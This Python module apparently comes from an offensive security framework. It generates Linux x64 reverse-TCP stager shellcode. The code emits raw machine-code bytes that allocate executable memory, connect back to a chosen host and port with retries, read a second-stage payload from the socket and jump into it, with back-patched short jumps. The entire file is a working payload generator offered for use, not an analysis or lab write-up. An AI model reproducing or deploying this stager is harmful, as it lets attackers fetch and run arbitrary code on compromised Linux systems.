import dataclasses
import socket
import struct
from typing import Any

from teralibs.tsf.core.payload.linux.x64.prepends import LinuxX64Prepends


@dataclasses.dataclass(slots=True)
class JumpPatchOffsets:
    """Relative jump patch locations inside the shellcode buffer."""

    js_failed_mmap: int = 0
    js_failed_sock: int = 0
    jns_recv: int = 0
    jz_failed: int = 0
    jns_connect: int = 0
    js_failed_recv: int = 0

    def clear(self):
        """Reset all offsets to zero."""
        for field in dataclasses.fields(self):
            setattr(self, field.name, 0)


@dataclasses.dataclass(slots=True)
class CodeBlockOffsets:
    """Code block entry offsets inside the shellcode buffer."""

    connect: int = 0
    recv: int = 0
    failed: int = 0

    def clear(self):
        """Reset all offsets to zero."""
        for field in dataclasses.fields(self):
            setattr(self, field.name, 0)


class ReverseTcpX64(LinuxX64Prepends):
    """Mixin that provides Linux x64 reverse-TCP stager generation."""

    # Offset
    jump_patch_offsets: Any = JumpPatchOffsets()
    code_block_offsets: Any = CodeBlockOffsets()

    # Generation state
    buf: bytearray = bytearray()

    def _clear_state(self):
        """Reset all generation state to fresh instance-level values."""
        # Replace (not mutate) the shared class-level dataclass objects
        # so that concurrent payload generation calls don't race on them.
        self.buf = bytearray()
        self.jump_patch_offsets = JumpPatchOffsets()
        self.code_block_offsets = CodeBlockOffsets()

    def _push_imm(self, value):
        """Encode a PUSH immediate in shortest valid x86 form."""
        if -128 <= value <= 127:
            return bytes([0x6A, value & 0xFF])

        if not -2147483648 <= value <= 2147483647:
            raise ValueError("imm32 out of range")

        return b"\x68" + struct.pack("<i", value)

    def _encode_host_port(self, host, port):
        """Proper 8-byte sockaddr_in layout: [AF_INET (2 bytes)][port (2 bytes BE)][IPv4 (4 bytes)]"""
        return (
            struct.pack("<H", 2)  # sin_family (little-endian)
            + struct.pack(">H", port)  # sin_port (big-endian)
            + socket.inet_aton(host)  # sin_addr (network order)
        )

    def emit(self, *chunks):
        """Append instruction bytes to the shellcode buffer."""
        for chunk in chunks:
            self.buf.extend(chunk)

    # Shellcode generator
    def generate_reverse_tcp(
        self,
        *,
        host_option,
        retry_count=5,
        sleep_seconds=5.0,
        read_length=4096,
    ):
        """Assemble the Linux x64 reverse-TCP stager shellcode with back-patching."""
        self._clear_state()

        sleep_s = int(sleep_seconds)
        sleep_ns = int((sleep_seconds % 1) * 1_000_000_000)

        # 8-byte sockaddr_in (AF_INET, Port, IP)
        hostport_imm64 = self._encode_host_port(host_option[0], host_option[1])

        # Allocation: mmap(NULL, len, PROT_RWX, MAP_PRIV|MAP_ANON, 0, 0)
        self.emit(
            b"\x31\xff",  # xor edi, edi          ; addr = NULL
            b"\x6a\x09\x58",  # push 9; pop rax       ; syscall: mmap
            b"\x99",  # cdq                   ; rdx = 0
            b"\xb6\x10",  # mov dh, 0x10          ; sets rdx to 4096
            b"\x48\x89\xd6",  # mov rsi, rdx          ; len = 4096
            b"\x4d\x31\xc9",  # xor r9, r9            ; offset = 0
            b"\x6a\x22\x41\x5a",  # push 0x22; pop r10    ; flags: MAP_PRIVATE | MAP_ANONYMOUS
            b"\x6a\x07\x5a",  # push 0x07; pop rdx    ; prot: PROT_READ|WRITE|EXEC
            b"\x0f\x05",  # syscall               ; execute mmap
            b"\x48\x85\xc0",  # test rax, rax         ; check for error
        )
        self.jump_patch_offsets.js_failed_mmap = len(self.buf)
        self.emit(b"\x78\x00")  # js failed_exit (Patch A)
        self.emit(b"\x49\x89\xc4")  # mov r12, rax          ; Save buffer address in r12

        # Create Socket: socket(AF_INET, SOCK_STREAM, 0)
        # Store retry count in r13 for the loop
        self.emit(self._push_imm(retry_count), b"\x41\x5d")  # push retry; pop r13
        self.emit(
            b"\x6a\x29\x58",  # push 0x29; pop rax    ; syscall: socket
            b"\x99",  # cdq                   ; protocol = 0
            b"\x6a\x02\x5f",  # push 2; pop rdi       ; family: AF_INET
            b"\x6a\x01\x5e",  # push 1; pop rsi       ; type: SOCK_STREAM
            b"\x0f\x05",  # syscall               ; execute socket
            b"\x48\x85\xc0",  # test rax, rax         ; check for error
        )
        self.jump_patch_offsets.js_failed_sock = len(self.buf)
        self.emit(b"\x78\x00")  # js failed_exit (Patch B)
        self.emit(b"\x48\x97")  # xchg rdi, rax         ; Move socket fd to rdi

        # Connect Loop: connect(sockfd, sockaddr, addrlen)
        self.code_block_offsets.connect = len(self.buf)
        self.emit(
            b"\x48\xb9",
            hostport_imm64,  # mov rcx, imm64     ; Load 8-byte sockaddr_in
            b"\x51",  # push rcx           ; Push struct to stack
            b"\x48\x89\xe6",  # mov rsi, rsp       ; rsi = *sockaddr
            b"\x6a\x10\x5a",  # push 0x10; pop rdx ; addrlen = 16
            b"\x6a\x2a\x58",  # push 0x2a; pop rax ; syscall: connect
            b"\x0f\x05",  # syscall            ; execute connect
            b"\x59",  # pop rcx            ; cleanup stack
            b"\x48\x85\xc0",  # test rax, rax      ; check success
        )
        self.jump_patch_offsets.jns_recv = len(self.buf)
        self.emit(b"\x79\x00")  # jns recv_stage (Patch C)

        # Retry Logic: nanosleep()
        self.emit(b"\x49\xff\xcd")  # dec r13            ; r13-- (retry count)
        self.jump_patch_offsets.jz_failed = len(self.buf)
        self.emit(b"\x74\x00")  # jz failed_exit (Patch D)

        # Create timespec struct { tv_sec, tv_nsec } on stack
        self.emit(
            self._push_imm(sleep_ns),  # push sleep_ns      ; timespec.tv_nsec
            self._push_imm(sleep_s),  # push sleep_s       ; timespec.tv_sec
            b"\x48\x89\xe7",  # mov rdi, rsp       ; rdi = *timespec
            b"\x48\x31\xf6",  # xor rsi, rsi       ; rsi = NULL
            b"\x6a\x23\x58",  # push 0x23; pop rax ; syscall: nanosleep
            b"\x0f\x05",  # syscall            ; sleep
            b"\x48\x83\xc4\x10",  # add rsp, 16        ; cleanup timespec
        )
        self.jump_patch_offsets.jns_connect = len(self.buf)
        self.emit(b"\xeb\x00")  # jmp connect (Patch E)

        # Recv Stage: read(sockfd, buffer, read_length)
        self.code_block_offsets.recv = len(self.buf)
        self.emit(
            b"\x4c\x89\xe6",  # mov rsi, r12       ; buffer = mmap addr
            b"\x48\x31\xc0",  # xor rax, rax       ; syscall: read
            b"\x48\xc7\xc2",  # mov rdx, imm32     ; length
            struct.pack("<I", read_length),
            b"\x0f\x05",  # syscall            ; read from socket
            b"\x48\x85\xc0",  # test rax, rax
        )
        self.jump_patch_offsets.js_failed_recv = len(self.buf)
        self.emit(b"\x78\x00")  # js failed_exit (Patch F)
        self.emit(b"\x41\xff\xe4")  # jmp r12            ; JUMP TO STAGE

        # Exit Block: exit(0)
        self.code_block_offsets.failed = len(self.buf)
        self.emit(
            b"\x6a\x3c\x58",  # push 0x3c; pop rax ; syscall: exit
            b"\x48\x31\xff",  # xor rdi, rdi       ; status 0
            b"\x0f\x05",  # syscall            ; execute exit
        )

        # 7. Final Back-patching
        self._apply_patches()

        return bytes(self.buf)

    def _apply_patches(self):
        """Calculates relative displacements for short jumps."""

        def _patch(offset, target):
            if offset == 0:
                return
            disp = target - (offset + 2)
            self.buf[offset + 1] = disp & 0xFF

        _patch(self.jump_patch_offsets.js_failed_mmap, self.code_block_offsets.failed)
        _patch(self.jump_patch_offsets.js_failed_sock, self.code_block_offsets.failed)
        _patch(self.jump_patch_offsets.jns_recv, self.code_block_offsets.recv)
        _patch(self.jump_patch_offsets.jz_failed, self.code_block_offsets.failed)
        _patch(self.jump_patch_offsets.jns_connect, self.code_block_offsets.connect)
        _patch(self.jump_patch_offsets.js_failed_recv, self.code_block_offsets.failed)
